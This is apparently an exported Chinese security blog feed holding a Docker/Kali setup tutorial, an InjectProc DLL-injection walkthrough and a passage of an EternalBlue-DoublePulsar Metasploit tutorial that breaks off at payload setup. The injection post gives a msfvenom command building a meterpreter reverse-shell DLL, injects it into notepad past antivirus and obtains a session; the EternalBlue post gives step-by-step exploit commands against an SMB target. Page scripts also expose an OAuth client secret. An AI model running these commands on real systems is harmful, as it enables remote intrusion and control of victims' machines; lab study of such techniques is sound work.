here"></p><p> <span style="color: #ffff99;">解决方案：（Windows环境下手动更新boot2docker.iso）下载boot2docker.ISO    进行替换该C盘当前用户目录下的   .docker/machine/cache\boot2docker.iso 的boot2docker.iso这个镜像文件进行一个替换</span> <img src="http://ojg8j426f.bkt.clouddn.com/1491230816377.jpg" alt="enter description here"><br>即可解决下载错误。</p><p><img src="http://ojg8j426f.bkt.clouddn.com/094503_jsqI_2621890.png" alt="enter description here"></p><p><br></p><h2 id="0x03-linux下安装docker"><a href="#0x03-linux下安装docker" class="headerlink" title="0x03 linux下安装docker"></a>0x03 linux下安装docker</h2><p>linux下安装docker最低系统安装要求为： Ubuntu 版本最低为 12.04 LTS，但从稳定性上考虑，推荐使用 14.04 LTS 或更高的版本。Debian 7 Wheezy (64-bit)（必须启用 backports)<br>linux下安装docker 使用以下命令即可进行安装。<br>我这边就使用深度linux64位 来举例子安装在linux下安装说明吧！</p><pre>apt-get install docker.io</pre><p><img src="http://ojg8j426f.bkt.clouddn.com/1491236394491.jpg" alt="enter description here"><br>&nbsp;<br><span style="color: #ffff99;">建立 docker 用户组</span><br>&nbsp;</p><p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组<br>安装docker.io 的时候已经自动添加了docker用户组，只需将当前非root权限的用户 添加docker组即可</p><pre>usermod -aG docker $USER</pre><p>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="0x04-Mac-os-X-下-安装"><a href="#0x04-Mac-os-X-下-安装" class="headerlink" title="0x04 Mac os X 下 安装"></a>0x04 Mac os X 下 安装</h2><p>苹果系统安装我这里就没什么好说的了，苹果系统下的都是一键安装的。<br>Docker for mac 下载链接：<a href="https://www.docker.com/docker-mac" target="_blank" rel="external">https://www.docker.com/docker-mac</a><br>去官网下载docker安装即可<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239502131.jpg" alt="enter description here"><br>&nbsp;<br>将安装包下载后，拖放应用程序即可。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239397989.jpg" alt="enter description here"><br>&nbsp;<br>安装后，启动docker后可在，右上角看到docker -小鲸鱼的图标。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239371298.jpg" alt="enter description here"></p><p>&nbsp;<br>安装后可在终端下直接使用docker命令。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239555703.jpg" alt="enter description here"></p><p>&nbsp;<br>&nbsp;</p><h2 id="0x10-Docker-常用命令简单使用实例"><a href="#0x10-Docker-常用命令简单使用实例" class="headerlink" title="0x10 Docker 常用命令简单使用实例"></a>0x10 Docker 常用命令简单使用实例</h2><p>&nbsp;<br><strong><span style="color: #ffff99;">1.搜索镜像</span></strong><br>&nbsp;</p><p></p><h4>docker search 镜像名称</h4><br> kali官方 docker镜像拉取说明:<a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="external">https://www.kali.org/news/official-kali-linux-docker-images/</a><p></p><p> 搜索kali 镜像</p><pre>docker search kali</pre><p><img src="http://ojg8j426f.bkt.clouddn.com/1491238412622.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">2.docker_kali镜像拉取下载</span></strong><br>&nbsp;</p><p><pre>docker pull kalilinux/kali-linux-docker</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491271361357.jpg" alt="enter description here"><br> <br><br> 不过在这里会产生一个问题，镜像下载慢！！因为镜像在国外,所以下载过程可能会延迟掉线这样会非常不友好。<br> &nbsp;<br><strong><span style="color: #ffff99;"> 3.我们可以使用几个国内的docker镜像加速器 阿里云加速器&amp;DaoCloud 加速器！！！！！</span></strong><br>&nbsp;<br>如果你使用的docker是docker for windows 、或者docker for mac 的话 推荐可使用‘DaoCloud 加速器’  <a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="external">https://www.daocloud.io/mirror#accelerator-doc</a>  </p><p>&nbsp;<br>一、在‘DaoCloud 加速器’ 注册登录后 进行复制镜像地址，到docker下进行设置。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/98A7F397-7E2C-436D-A7D7-75F3E568CFAD.png" alt="enter description here"></p><p>二、右键点击桌面顶栏的 docker 图标，选择 Preferences，找到Daemon，在registy mirrors 中添加，并应用重启docker（apply&amp;restart）<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/9C71A3C0-D6CC-42C6-B95A-BE57D1C0E7A1.png" alt="enter description here"></p><p><strong><span style="color: #ffff99;">4.如果你是linux 或者docker tools box 的话 可以选择阿里云加速器–docker镜像仓库。</span></strong><br>&nbsp;<br><a href="https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator" target="_blank" rel="external">https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator</a></p><p><img src="http://ojg8j426f.bkt.clouddn.com/AE9B5A19-6CE4-4243-919A-104701E192AD.png" alt="enter description here"><br>&nbsp;<br>查看阿里云加速器操作文档，以及docker的版本，进行对应操作。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491272245455.jpg" alt="enter description here"><br>&nbsp;<br>配置完之后，镜像开启加速下载如下图；<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/B53F5C74-BE41-4B29-A2F3-8EE7BCBE6787.png" alt="enter description here"></p><p><strong><span style="color: #ffff99;">5.创建并连接容器、端口映射、绑定随机id</span></strong><br>&nbsp;</p><p><pre>docker run -i -t –name kali  -p 8081:80  -p 8080:8080  -p 4444:4444  -p 5555:5555  -p 2222:22  kalilinux/kali-linux-docker  /bin/bash </pre></p><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491272631908.jpg" alt="enter description here"><br>&nbsp;<br>命令详解：<br>一、run命令简单使用<br><p><pre>docker run -i -t //创建并连接容器， run命令参数使用    -i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用</pre></p><br>&nbsp;<br>在这里我们使用docker ps -a  查看docker容器运行、创建的历史记录，可以发现你每次创建一个容器的时候都会生成一个随机id、容器名称，在81324e6f0059我们可以看到，这是我们之前生成的，也是指定了容器的名称，将ID、名称附着在容器上。<br><pre>docker  ps -a</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/80AE92EB-A59E-4D49-8DFB-31A89C940E1E.png" alt="enter description here"><br><strong><span style="color: #ffff99;">二、Docker 会为我们创建每一个容器自动生成一个随机ID、名称，如果想为容器指定一个名称，而不是使用自动生成的，则可以使用–name 来使用</span></strong><br>&nbsp;<br>如：<pre>–name kali  //指定容器名称为kali</pre><br><br><br><strong><span style="color: #ffff99;">三、容器端口映射</span></strong><br>docker指令：docker run -p ip:hostPort:containerPort redis<br>&nbsp;<br>使用-p参数会分配宿主机的端口映射到虚拟机。<br>IP表示主机的IP地址。<br>hostPort表示宿主机的端口。<br>containerPort表示虚拟机的端口。<br>以下为端口映射实例图片对比：<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275131945.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/1491297367379.jpg" alt="enter description here"><br><br>我们也可以采用 指定容器端口映射本机随机端口,防止本机端口占用等情况。<br><strong><span style="color: #ffff99;">格式为-p &lt;空&gt;:容器需映射端口</span></strong><br><strong><span style="color: #ffff99;">可指定物理机的随机端口 映射容器端口</span></strong><br><pre> docker run -i -t  -v /Users/demon:/root  -p :4444 -p :5555 -p :22 kali /bin/bash</pre><br>&nbsp;<br>端口被占用<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275841716.jpg" alt="enter description here"><br>&nbsp;<br>指定随机端口为空。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275732022.jpg" alt="enter description here"><br>&nbsp;<br>映射为随机端口<br><img src="http://ojg8j426f.bkt.clouddn.com/87923B06-18E6-4872-B6A0-38A2F6184F48.png" alt="enter description here"><br>&nbsp;<br><br><strong><span style="color: #ffff99;">四、使用-v 参数实现目录共享挂载，docker可以支持把一个宿主机上的目录挂载到镜像里。通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径。现在镜像内就可以共享宿主机里的文件了。然而我这边不打算采用目录共享，可用ssh的特性进行文件传输上传下载等功能</span></strong><br><pre>docker run -i -t  -v /Users/demon:/root  -p :4444 -p :5555 -p :22 kali /bin/bash</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0CDE2A94-D007-4486-BD9F-02982CC894EA.png" alt="enter description here"><br><br><strong><span style="color: #ffff99;">6.查看列举本地镜像。</span></strong><br>&nbsp;<br><pre>docker images</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1491276720374.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">7.开启容器</span></strong><br>&nbsp;<br><strong>start命令</strong><br>docker start  容器ID or 容器名称<br>&nbsp;<br><pre>docker start  e8d612658eb0</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/C1922BA7-33CD-48AE-9576-24F21572A399.png" alt="enter description here"><br>&nbsp;<br>容器名称可指容器随机生成的名称亦可是–name 指定过的名称 如之前指定的是kali 这里就可以使用 docker start kali<br><img src="http://ojg8j426f.bkt.clouddn.com/1491277103204.jpg" alt="enter description here"><br><br><br><strong><span style="color: #ffff99;">8.连接容器</span></strong><br>&nbsp;<br><strong>attach 命令</strong><br>docker attach 是Docker自带的命令。下面示例如何使用该命令。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279122026.jpg" alt="enter description here"><br>但是使用 attach 命令有时候并不方便。当多个窗口同时 attach 到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。<br>&nbsp;<br>同样docker attach 可以接上容器名称or 容器ID<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/3E7A608E-50F0-41BE-A89E-24DD648425BA.png" alt="enter description here"><br>&nbsp;<br>使用attach 窗口占用解决方案    &nbsp; 1.使用kimtematic GUI管理工具 点击exec。<br>&nbsp;2.使用命令行 exec命令<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286106067.jpg" alt="enter description here"><br>&nbsp;<br><pre>docker exec -it kali /bin/bash</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286369676.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286106067.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">9.停止容器</span></strong><br>&nbsp;<br>在容器内使用exit即停止容器<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279468779.jpg" alt="enter description here"><br>&nbsp;<br>或在容器外使用stop命令即停止容器<br><img src="http://ojg8j426f.bkt.clouddn.com/30BD9BC4-E5C6-4FD3-8750-C5D92BF0E02A.png" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">10.删除容器</span></strong><br>&nbsp;<br>rm命令<br>使用rm命令之前必须停止该运行的容器。<br>docker rm 容器id or 容器名称<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279919070.jpg" alt="enter description here"><br>&nbsp;<br><br><img src="http://ojg8j426f.bkt.clouddn.com/1491279954846.jpg" alt="enter description here"><br><br><strong><span style="color: #ffff99;">11.批量删除停止容器</span></strong><br>&nbsp;<br>docekr ps -a -q 查看容器停止或者正在运行的容器id<br>docker rm 之前也说到过 是删除容器的意思，但是docker rm 本身默认的是不会删除正在运行的容器。如此一来 docker rm $(docker ps -a -q)  的意思就是 批量删除停止的容器。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491280028649.jpg" alt="enter description here"><br><br><strong><span style="color: #ffff99;">12.删除本地镜像</span></strong><br> docker rmi  镜像名or 镜像ID     删除之前需停止容器并删除和该镜像关联的容器<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0737CD0E-62EC-4066-9D64-0A7B4E7A39D6.png" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">13.将容器做备份快照迁移。</span></strong><br>Docker是基于镜像的。镜像类似于已经包含了文件、配置和安装好的程序的虚拟机镜像。同样的，你可以像启动虚拟机一样启动多个镜像实例。运行中的镜像称为容器。你可以修改容器（比如删除一个文件），但这些修改不会影响到镜像。不过，你使用docker commit <container-id> <image-name>命令可以把一个正在运行的容器变成一个新的镜像。<br>&nbsp;<br>docker save : 将指定镜像保存成 tar 归档文件。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491283188996.jpg" alt="enter description here"><br>&nbsp;<br>Export命令用于持久化容器（不是镜像）。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491283416405.jpg" alt="enter description here"><br>&nbsp;<br>以上同样都是导出，但是区别在于save 是导出镜像而不是导出容器，export是导出容器，历史记录但不能历史层回滚。反而使用export命令导出保存快照，你将无法回滚到之前的层(layer)。<br>以下是使用导入save的镜像以及export的镜像，导入镜像的大小。<br>&nbsp;<br>&nbsp;<br><pre>docker load -i  kali.tar </pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491284429626.jpg" alt="enter description here"><br>&nbsp;<br><pre>docker import kali.tar kali</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491284611770.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #ffff99;">14 .docker 资源占用之内存</span></strong><br>docker stats可以观察到此时的资源使用情况是固定不变的<br><p><pre> docker stats</pre></p><br><img src="http://ojg8j426f.bkt.clouddn.com/1491287009622.jpg" alt="enter description here"><br>&nbsp;<br>使用-m 参数可指定内容（m、g）使用docker -m操作会使内存被限制为输入大小的两倍，内存上限为400m<br><img src="http://ojg8j426f.bkt.clouddn.com/1491287242869.jpg" alt="enter description here"><br>&nbsp;<br>可使用内存压力测试工具：stress，对内存进行测试。<br>若运行后在几秒内被杀死说明内存被限制为400M<br><img src="http://ojg8j426f.bkt.clouddn.com/1491287897151.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><br><br><strong><span style="color: #ffff99;">15.尝试写一份简单的Dockerfile</span></strong><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491290859872.jpg" alt="enter description here"><br><p><pre><br>FROM kalilinux/kali-linux-docker<br># 拉取官方kali镜像<br><br>MAINTAINER Demon<br>#注明作者<br><br>RUN apt-get update &amp;&amp; apt-get install -y \<br>  sqlmap \<br>  ssh \<br>  –no-install-recommends &amp;&amp; rm -rf /var/cache/apt/archives/*.deb<br>#使run 命令 执行 要安装的软件如安装ssh 、sqlmap 以及清理缓存<br><br><br>ADD sshd_config /etc/ssh/<br>#添加本地文件到容器的/etc/ssh/sshd_config 进行替换。<br></pre></p><p>dockerfile实现了自动拉去镜像、构建镜像、自动更新源、下载安装sqlmap、配置ssh等动作。<br>&nbsp;<br>docker build -t  kalil .  //编写完成 Dockerfile 后可以使用docker build来生成镜像。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289836365.jpg" alt="enter description here"><br>&nbsp;</p><p><img src="http://ojg8j426f.bkt.clouddn.com/1491289007362.jpg" alt="enter description here"><br>&nbsp;<br>创建并连接容器</p><p><pre>docker run -i -t –name=kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalil /bin/bash</pre>.<br>实现sqlmap ssh等配置<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289339017.jpg" alt="enter description here"><br>&nbsp;<br>实现已配置ssh<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289496145.jpg" alt="enter description here"></p><p><br><br>下载链接：<a href="https://github.com/boot2docker/boot2docker/releases" target="_blank" rel="external">https://github.com/boot2docker/boot2docker/releases</a><br><a href="https://www.docker.com" target="_blank" rel="external">https://www.docker.com</a>  docker<br><a href="https://www.docker.com/docker-windows" target="_blank" rel="external">https://www.docker.com/docker-windows</a> docker for windows<br><a href="https://www.docker.com/docker-mac" target="_blank" rel="external">https://www.docker.com/docker-mac</a>   docker for  mac<br><a href="https://www.docker.com/products/docker-toolbox" target="_blank" rel="external">https://www.docker.com/products/docker-toolbox</a> docker tools box<br>参考资料：<a href="https://my.oschina.net/aixiaohua/blog/651171" target="_blank" rel="external">https://my.oschina.net/aixiaohua/blog/651171</a>  Windows环境下手动更新boot2docker.iso<br><a href="http://www.cnblogs.com/franson-2016/p/6412971.html" target="_blank" rel="external">http://www.cnblogs.com/franson-2016/p/6412971.html</a>  解决非root用户使用docker的办法<br><a href="https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html</a>  docker入门实践<br>亦可参考 我的好基友国光：<a href="http://www.sqlsec.com/2017/docker.html" target="_blank" rel="external">http://www.sqlsec.com/2017/docker.html</a> docker入门简明。<br><a href="http://www.tuicool.com/articles/EBNZBjJ" target="_blank" rel="external">http://www.tuicool.com/articles/EBNZBjJ</a>  安全相关Docker Image收集<br><a href="https://my.oschina.net/zjzhai/blog/225112" target="_blank" rel="external">https://my.oschina.net/zjzhai/blog/225112</a>  Docker的save和export命令的区别<br><a href="http://blog.csdn.net/u010472499/article/details/52994454" target="_blank" rel="external">http://blog.csdn.net/u010472499/article/details/52994454</a>   Docker 资源限制之内存<br><a href="http://www.jb51.net/article/103483.htm" target="_blank" rel="external">http://www.jb51.net/article/103483.htm</a>  Docker容器内存限制的方法<br><a href="http://os.51cto.com/art/201507/485007.htm" target="_blank" rel="external">http://os.51cto.com/art/201507/485007.htm</a>   Dockerfile命令介绍及实例</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script></image-name></container-id>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/create-reusable-burner-os-with-docker-part-2-customizing-our-hacking-container.1280x600.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>InjectProc&amp;Metasploit</title>
    <link href="http://yoursite.com/InjectProc.html"/>
    <id>http://yoursite.com/InjectProc.html</id>
    <published>2017-06-04T20:50:39.000Z</published>
    <updated>2017-09-11T16:41:48.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h2><p>流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。</p><p>有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。</p><p>大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。<br>&nbsp;</p><h2 id="DLL注入："><a href="#DLL注入：" class="headerlink" title="DLL注入："></a>DLL注入：</h2><p>打开目标进程。<br>分配空间<br>将代码写入远程进程。<br>执行远程代码。<br>&nbsp;<br>具体可以看看github内容介绍。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581431258.jpg" alt="enter description here"><br>&nbsp;<br>我看了大牛的视频自己学着模仿了一下<br>使用的InjectProc.exe在cmd运行<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581536842.jpg" alt="enter description here"><br>&nbsp;<br>这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。<br>首先我使用的是——  InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe<br>&nbsp;<br>首先下载到我的桌面，<a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a> ，和下载InjectProc.exe，是那位大牛制作完成的。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582442573.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582390129.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582636284.jpg" alt="enter description here"><br>&nbsp;<br>我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程<br>InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe。<br>在这里我们使用InjectProc\test_files目录中的<img src="http://ojg8j426f.bkt.clouddn.com/1496583170345.jpg" alt="enter description here">，并且我们随机打开一个进程如记事本进程。<br>使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583297150.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。<br>首先我们使用msfvenom 生成dll</p><p><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583594241.jpg" alt="enter description here"><br>&nbsp;<br>以及打开我们的msf开启监听<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583722323.jpg" alt="enter description here"><br>&nbsp;<br>那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中<img src="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg" alt="enter description here"><br>&nbsp;<br>使用以下命令,并且打开记事本。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg" alt="enter description here"><br>&nbsp;<br>得到最终会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>视频资料：<a href="https://www.youtube.com/watch?v=GT9nBuXatmU" target="_blank" rel="external">https://www.youtube.com/watch?v=GT9nBuXatmU</a>   InjectProc | Process Injection Techniques | Malware<br><a href="https://www.pinterest.com/penetrationtesting/" target="_blank" rel="external">https://www.pinterest.com/penetrationtesting/</a><br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a>   github</p><p><div id="container"></div></p><p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p><script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script><script>  var gitment = new Gitment({    owner: 'secistblog',    repo: 'secistblog.github.io',    oauth: {      client_id: '31ca58bed60fa9231b5f',      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',    },  })  gitment.render('container')</script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg&quot; alt=&quot;enter description here&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Metasploit" scheme="http://yoursite.com/categories/Metasploit/"/>
    
    
      <category term="Metasploit" scheme="http://yoursite.com/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>Eternalblue-Doublepulsar完善教程</title>
    <link href="http://yoursite.com/Eternalblue-Doublepulsar1.html"/>
    <id>http://yoursite.com/Eternalblue-Doublepulsar1.html</id>
    <published>2017-05-15T20:35:08.000Z</published>
    <updated>2017-09-12T13:54:58.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/20170515_065228_919.jpg" alt="enter description here"><br><a id="more"></a></p><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'http://oc78wb8cz.bkt.clouddn.com/eternalblue_doublepulsar.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><p>   Eternalblue-Doublepulsar  链接 —–&gt;github：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="external">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p><p>1.实验环境 metasploitable3 虚拟机<br>2.攻击环境 kali 2017<br><img src="http://ojg8j426f.bkt.clouddn.com/1494856015028.jpg" alt="enter description here"></p><h2 id="扫描ms17-010-是否存在"><a href="#扫描ms17-010-是否存在" class="headerlink" title="扫描ms17-010 是否存在"></a>扫描ms17-010 是否存在</h2><p>&nbsp;</p><p><pre>msf &gt; use auxiliary/scanner/smb/smb_ms17_010</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494974407797.jpg" alt="enter description here"><br>&nbsp;</p><p><pre>msf auxiliary(smb_ms17_010) &gt; set RHOSTS 192.168.1.105</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494974439342.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494974419241.jpg" alt="enter description here"><br>&nbsp;</p><p><pre>exploit</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494974332065.jpg" alt="enter description here"><br>&nbsp;<br>可以看到ms17-010存在，并使用nmap可以看到445开启<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494974535040.jpg" alt="enter description here"><br>&nbsp;</p><h2 id="使用exploit——ms17-010"><a href="#使用exploit——ms17-010" class="headerlink" title="使用exploit——ms17-010"></a>使用exploit——ms17-010</h2><p>&nbsp;<br>&nbsp;<br>1.首先将github的项目下载来下，将eternalblue_doublepulsar.rb 拷贝到 /usr/share/metasploit-framework/modules/exploits/windows/smb目录中,并且将Eternalblue-Doublepulsar-Metasploit整个目录复制到root目录下。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494975511424.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494856357253.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494856504484.jpg" alt="enter description here"></p><p>2.将下载的Eternalblue-Doublepulsar-Metasploit 目录整个拷贝到 root目录下<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1494856644265.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>3.使用exploit模块</p><p><pre>use exploit/windows/smb/eternalblue_doublepulsar</pre><br>&nbsp;<br>4.当执行exploit ,会出现问题时？该怎么办？<br><img src="http://ojg8j426f.bkt.clouddn.com/1494859066766.jpg" alt="enter description here"><br>&nbsp;</p><p>5.打开多架构支持/安装wine32</p><p>&nbsp;</p><p><pre>wine  -h</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/EK278L3MGQI4%28%5B_ZXDR%5D%290W.png" alt="enter description here"><br>&nbsp;<br>再exploit时候。。。。<br>使用以下命令即可解决</p><p><pre>dpkg –add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494859034634.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>&nbsp;</p><h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><p>1.我们查看设置选项看看那些需要设置, DOUBLEPULSARPATH 和ETERNALBLUEPATH   无需设置，因为目录已经复制到root目录下了，以及target 是默认的2008 也无需设置，如果是其他版本可使用show targets 和set target 进行设置</p><p><pre> options </pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494975438346.jpg" alt="enter description here"><br>&nbsp;<br>2.因为目标机子是64位，所以需要进行以下设置。</p><p><pre>set PROCESSINJECT lsass.exe </pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494975731948.jpg" alt="enter description here"><br>&nbsp;</p><p><pre> set TARGETARCHITECTURE x64</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494975929427.jpg" alt="enter description here"><br>3.设置目标ip，端口不用动，就是445</p><p><pre>set RHOST 192.168.1.105</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1494975899435.jpg" alt="enter description here"><br>&nbsp;<br>4.设置PAYLOAD 